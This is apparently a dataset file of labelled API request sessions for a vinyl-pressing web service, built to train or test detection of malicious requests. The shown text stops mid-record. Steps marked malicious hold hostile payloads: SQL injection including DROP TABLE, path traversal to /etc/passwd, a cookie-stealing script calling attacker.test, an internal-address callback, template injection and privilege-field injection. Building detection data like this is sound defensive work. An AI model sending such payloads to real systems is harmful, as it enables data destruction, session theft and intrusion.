@@ -1,0 +1,5996 @@
+[
+  {
+    "session_id": "sess101",
+    "client_ip": "192.168.1.10",
+    "steps": [
+      {
+        "id": "sess101-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer1@chromapress.test",
+          "password": "SecurePassword123!"
+        },
+        "note": "The designer authenticates to receive a bearer token."
+      },
+      {
+        "id": "sess101-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {
+          "limit": 10
+        },
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": null,
+        "note": "The client lists existing pressing projects owned by the designer."
+      },
+      {
+        "id": "sess101-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_alpha_01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": null,
+        "note": "The designer retrieves details for their first project."
+      },
+      {
+        "id": "sess101-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_beta_02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": null,
+        "note": "The designer checks a second project they own as part of normal work."
+      },
+      {
+        "id": "sess101-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_alpha_01/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": null,
+        "note": "The designer retrieves the track list for the first project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess102",
+    "client_ip": "10.0.0.25",
+    "steps": [
+      {
+        "id": "sess102-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer2@chromapress.test",
+          "password": "Pass'word123"
+        },
+        "note": "The designer logs in using an apostrophe inside the password string."
+      },
+      {
+        "id": "sess102-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client queries the public health status of the pressing service."
+      },
+      {
+        "id": "sess102-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": {
+          "title": "Summer EP Vinyl",
+          "description": "Limited edition colored pressing."
+        },
+        "note": "The designer creates a new pressing project."
+      },
+      {
+        "id": "sess102-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": null,
+        "note": "The client retrieves the updated list of projects."
+      }
+    ]
+  },
+  {
+    "session_id": "sess103",
+    "client_ip": "172.16.4.88",
+    "steps": [
+      {
+        "id": "sess103-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": {
+          "title": "Project Alpha",
+          "description": "Standard release",
+          "query_injection_payload": "'; DROP TABLE projects; --"
+        },
+        "note": "The client attempts query injection via an unmapped field value."
+      },
+      {
+        "id": "sess103-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIs..."
+        },
+        "body": null,
+        "note": "The client returns to normal listing of projects after the attempt."
+      },
+      {
+        "id": "sess103-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      },
+      {
+        "id": "sess103-s04",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer3@chromapress.test",
+          "password": "ValidPassword99#"
+        },
+        "note": "The user authenticates with correct credentials."
+      }
+    ]
+  },
+  {
+    "session_id": "sess104",
+    "client_ip": "192.168.2.50",
+    "steps": [
+      {
+        "id": "sess104-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer4@chromapress.test",
+          "password": "CorrectHorseBattery"
+        },
+        "note": "The user logs into the system."
+      },
+      {
+        "id": "sess104-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_xyz"
+        },
+        "body": null,
+        "note": "The client lists all projects."
+      },
+      {
+        "id": "sess104-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_123",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_xyz"
+        },
+        "body": null,
+        "note": "The client inspects a specific project."
+      },
+      {
+        "id": "sess104-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_456",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_xyz"
+        },
+        "body": null,
+        "note": "The client switches to inspecting a second owned project."
+      },
+      {
+        "id": "sess104-s05",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_123/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_xyz"
+        },
+        "body": {
+          "trackName": "Side A - Intro\n and overview of tracks",
+          "durationSeconds": 180,
+          "comment": "Drafting details."
+        },
+        "note": "The track creation body contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess104-s06",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_789",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_xyz"
+        },
+        "body": null,
+        "note": "The client retrieves track details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess105",
+    "client_ip": "10.0.5.12",
+    "steps": [
+      {
+        "id": "sess105-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer5@chromapress.test",
+          "password": "SecretPassword1"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess105-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_5"
+        },
+        "body": null,
+        "note": "The client fetches the project list."
+      },
+      {
+        "id": "sess105-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_alpha/tracks",
+        "query": {
+          "unowned_id_one": "proj_secret_99",
+          "unowned_id_two": "proj_admin_00",
+          "unowned_id_three": "proj_internal_01"
+        },
+        "headers": {
+          "Authorization": "Bearer token_5"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The path is a declared track list. The extra query names are not parameters of this operation."
+      },
+      {
+        "id": "sess105-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_alpha/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_5"
+        },
+        "body": null,
+        "note": "The client continues with valid track retrieval."
+      },
+      {
+        "id": "sess105-s05",
+        "label": "benign",
+        "method": "DELETE",
+        "path": "/notes/note_abc",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_5"
+        },
+        "body": null,
+        "note": "The client deletes a mastering note."
+      }
+    ]
+  },
+  {
+    "session_id": "sess106",
+    "client_ip": "192.168.10.15",
+    "steps": [
+      {
+        "id": "sess106-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/register",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "newdesigner@chromapress.test",
+          "password": "Password1234!"
+        },
+        "note": "A new designer registers an account."
+      },
+      {
+        "id": "sess106-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "newdesigner@chromapress.test",
+          "password": "Password1234!"
+        },
+        "note": "The registered designer logs in."
+      },
+      {
+        "id": "sess106-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_new"
+        },
+        "body": {
+          "title": "First Release",
+          "description": "Debut album pressing."
+        },
+        "note": "The designer creates their first project."
+      },
+      {
+        "id": "sess106-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_new_1",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_new"
+        },
+        "body": null,
+        "note": "The client retrieves the created project."
+      },
+      {
+        "id": "sess106-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_new_2",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_new"
+        },
+        "body": null,
+        "note": "The client inspects a second owned project."
+      },
+      {
+        "id": "sess106-s06",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj_new_1/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_new",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+        },
+        "body": {
+          "trackName": "Bonus Track",
+          "durationSeconds": 210,
+          "harmless_field": "metadata_v1"
+        },
+        "note": "The request includes an old browser user-agent and a harmless extra field."
+      },
+      {
+        "id": "sess106-s07",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_new_1/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_new"
+        },
+        "body": null,
+        "note": "The client checks mastering notes for the track."
+      }
+    ]
+  },
+  {
+    "session_id": "sess107",
+    "client_ip": "10.20.30.40",
+    "steps": [
+      {
+        "id": "sess107-s01",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj_100",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": {
+          "title": "Master Project",
+          "status": "active",
+          "is_admin": true
+        },
+        "note": "The client sends a privilege field that is not in the contract."
+      },
+      {
+        "id": "sess107-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_100",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client fetches the project details normally."
+      },
+      {
+        "id": "sess107-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_200",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      },
+      {
+        "id": "sess107-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks public system status."
+      }
+    ]
+  },
+  {
+    "session_id": "sess108",
+    "client_ip": "192.168.5.99",
+    "steps": [
+      {
+        "id": "sess108-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer8@chromapress.test",
+          "password": "Password888!"
+        },
+        "note": "The designer authenticates."
+      },
+      {
+        "id": "sess108-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_8"
+        },
+        "body": null,
+        "note": "The client lists pressing projects."
+      },
+      {
+        "id": "sess108-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/tracks/track_123/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_8"
+        },
+        "body": {
+          "content": "Please review the equalizer settings. The term buffer overflow was discussed in the team meeting."
+        },
+        "note": "The mastering note mentions a technical word that is only discussed."
+      },
+      {
+        "id": "sess108-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_123/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_8"
+        },
+        "body": null,
+        "note": "The client lists track notes."
+      },
+      {
+        "id": "sess108-s05",
+        "label": "benign",
+        "method": "DELETE",
+        "path": "/notes/note_777",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_8"
+        },
+        "body": null,
+        "note": "The client deletes a mastering note."
+      }
+    ]
+  },
+  {
+    "session_id": "sess109",
+    "client_ip": "10.10.10.10",
+    "steps": [
+      {
+        "id": "sess109-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../../etc/passwd/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_mal"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via the path parameter."
+      },
+      {
+        "id": "sess109-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client queries public system status."
+      },
+      {
+        "id": "sess109-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer9@chromapress.test",
+          "password": "SecurePassword9!"
+        },
+        "note": "The user logs in with valid credentials."
+      },
+      {
+        "id": "sess109-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_mal"
+        },
+        "body": null,
+        "note": "The client lists projects normally."
+      }
+    ]
+  },
+  {
+    "session_id": "sess110",
+    "client_ip": "192.168.1.100",
+    "steps": [
+      {
+        "id": "sess110-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer10@chromapress.test",
+          "password": "Pass12345!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess110-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_10"
+        },
+        "body": null,
+        "note": "The client gets the project list."
+      },
+      {
+        "id": "sess110-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_alpha_10",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_10"
+        },
+        "body": null,
+        "note": "The client inspects the first project."
+      },
+      {
+        "id": "sess110-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_beta_10",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_10"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      },
+      {
+        "id": "sess110-s05",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/track_10/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_10"
+        },
+        "body": {
+          "content": "<script>fetch('http://attacker.test/log?cookie=' + document.cookie);</script>"
+        },
+        "note": "The client submits browser-executed code in a note field."
+      },
+      {
+        "id": "sess110-s06",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_10/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_10"
+        },
+        "body": null,
+        "note": "The client retrieves notes after the submission."
+      }
+    ]
+  },
+  {
+    "session_id": "sess111",
+    "client_ip": "172.31.25.10",
+    "steps": [
+      {
+        "id": "sess111-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer11@chromapress.test",
+          "password": "Password11!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess111-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_11"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess111-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_11"
+        },
+        "body": {
+          "title": "Internal Hook",
+          "description": "Callback to internal network http://127.0.0.1:8080/admin"
+        },
+        "note": "The client provides an internal address in a request body field."
+      },
+      {
+        "id": "sess111-s04",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {
+          "X-Custom-Test": "value'withquotes"
+        },
+        "body": null,
+        "note": "The client sends a status request with an extra header containing quotes."
+      },
+      {
+        "id": "sess111-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_11",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_11"
+        },
+        "body": null,
+        "note": "The client retrieves project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess112",
+    "client_ip": "10.50.100.2",
+    "steps": [
+      {
+        "id": "sess112-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer12@chromapress.test",
+          "password": "Password12!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess112-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_12"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess112-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_12"
+        },
+        "body": {
+          "title": "Template Test",
+          "description": "${7*7}"
+        },
+        "note": "The client injects a template expression into the description field."
+      },
+      {
+        "id": "sess112-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_12",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_12"
+        },
+        "body": null,
+        "note": "The client retrieves project details."
+      },
+      {
+        "id": "sess112-s05",
+        "label": "benign",
+        "method": "DELETE",
+        "path": "/projects/proj_12",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_12"
+        },
+        "body": null,
+        "note": "The client deletes the project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess113",
+    "client_ip": "192.168.3.40",
+    "steps": [
+      {
+        "id": "sess113-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer13@chromapress.test",
+          "password": "Password13!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess113-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_13"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess113-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj_13/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_13"
+        },
+        "body": {
+          "trackName": "Serialized Object",
+          "durationSeconds": 150,
+          "payload": "rO0ABXNyACFqYXZhLnV0aWwuSGFzaBNhcA..."
+        },
+        "note": "The client submits a serialized object string inside a track field."
+      },
+      {
+        "id": "sess113-s04",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/tracks/track_13/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_13"
+        },
+        "body": {
+          "content": "Please check mastering notes.\nAdditional info follows."
+        },
+        "note": "The mastering note contains a newline continuing a sentence."
+      },
+      {
+        "id": "sess113-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/track_13/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_13"
+        },
+        "body": null,
+        "note": "The client retrieves notes."
+      }
+    ]
+  },
+  {
+    "session_id": "sess114",
+    "client_ip": "10.0.8.44",
+    "steps": [
+      {
+        "id": "sess114-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer14@chromapress.test",
+          "password": "Password14!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess114-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_14"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess114-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_14"
+        },
+        "body": {
+          "title": "Log Injection",
+          "description": "Normal description\n2026-03-10 12:00:00 [INFO] Admin login success"
+        },
+        "note": "The client attempts injection using a newline plus a log stamp."
+      },
+      {
+        "id": "sess114-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_14",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_14"
+        },
+        "body": null,
+        "note": "The client fetches project details."
+      },
+      {
+        "id": "sess114-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_15",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_14"
+        },
+        "body": null,
+        "note": "The client inspects a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess115",
+    "client_ip": "192.168.100.5",
+    "steps": [
+      {
+        "id": "sess115-s01",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/config",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_user"
+        },
+        "body": null,
+        "note": "The client accesses an admin path that is not in the contract."
+      },
+      {
+        "id": "sess115-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer15@chromapress.test",
+          "password": "Password15!"
+        },
+        "note": "The user logs into their authorized account."
+      },
+      {
+        "id": "sess115-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_15"
+        },
+        "body": null,
+        "note": "The client lists their pressing projects."
+      },
+      {
+        "id": "sess115-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_15",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_15"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess115-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_16",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_15"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess116",
+    "client_ip": "10.0.12.34",
+    "steps": [
+      {
+        "id": "sess116-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer16@chromapress.test",
+          "password": "Password16!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess116-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_16"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess116-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_16a",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_16"
+        },
+        "body": null,
+        "note": "The client views the first project."
+      },
+      {
+        "id": "sess116-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_16b",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_16"
+        },
+        "body": null,
+        "note": "The client views a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess117",
+    "client_ip": "172.16.50.2",
+    "steps": [
+      {
+        "id": "sess117-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer17@chromapress.test",
+          "password": "Password17!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess117-s02",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_17"
+        },
+        "body": {
+          "title": "Acoustic Session",
+          "description": "Recorded live in studio.",
+          "debug_mode": false
+        },
+        "note": "The project creation includes a harmless extra debug field."
+      },
+      {
+        "id": "sess117-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_17"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess117-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_17",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_17"
+        },
+        "body": null,
+        "note": "The client views project details."
+      }
+    ]
+  },
+  {
+    "session_id": "sess118",
+    "client_ip": "192.168.8.88",
+    "steps": [
+      {
+        "id": "sess118-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer18@chromapress.test",
+          "password": "Password18!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess118-s02",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj_18/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_18"
+        },
+        "body": {
+          "trackName": "SQL Test",
+          "durationSeconds": 160,
+          "filter": "1 UNION SELECT null, null, null--'"
+        },
+        "note": "The client attempts query injection inside an unmapped track field."
+      },
+      {
+        "id": "sess118-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_18/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_18"
+        },
+        "body": null,
+        "note": "The client lists tracks for the project."
+      },
+      {
+        "id": "sess118-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_19",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_18"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess119",
+    "client_ip": "10.0.15.22",
+    "steps": [
+      {
+        "id": "sess119-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer19@chromapress.test",
+          "password": "Password19!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess119-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_19"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess119-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj_19/tracks",
+        "query": {
+          "target_id": "proj_master_00",
+          "alt_id": "proj_root_01",
+          "extra_id": "proj_sys_02"
+        },
+        "headers": {
+          "Authorization": "Bearer token_19"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The path is a declared track list. The extra query names are not parameters of this operation."
+      },
+      {
+        "id": "sess119-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_19",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_19"
+        },
+        "body": null,
+        "note": "The client views project details."
+      },
+      {
+        "id": "sess119-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_20",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_19"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess120",
+    "client_ip": "192.168.50.10",
+    "steps": [
+      {
+        "id": "sess120-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer20@chromapress.test",
+          "password": "Password20!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess120-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_20"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess120-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/projects/proj_20",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_20"
+        },
+        "body": {
+          "title": "Updated Title",
+          "role": "administrator"
+        },
+        "note": "The client updates the project including an unallowed role privilege field."
+      },
+      {
+        "id": "sess120-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_20",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_20"
+        },
+        "body": null,
+        "note": "The client verifies the project details."
+      },
+      {
+        "id": "sess120-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_21",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_20"
+        },
+        "body": null,
+        "note": "The client checks a second owned project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess121",
+    "client_ip": "10.0.30.5",
+    "steps": [
+      {
+        "id": "sess121-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer21@chromapress.test",
+          "password": "Password21!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess121-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_21"
+        },
+        "body": null,
+        "note": "The client lists projects."
+      },
+      {
+        "id": "sess121-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/tracks/../../var/log/chromapress/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_21"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via the track path parameter."
+      },
+      {
+        "id": "sess121-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj_21",
+        "query": {},
+        "headers": {
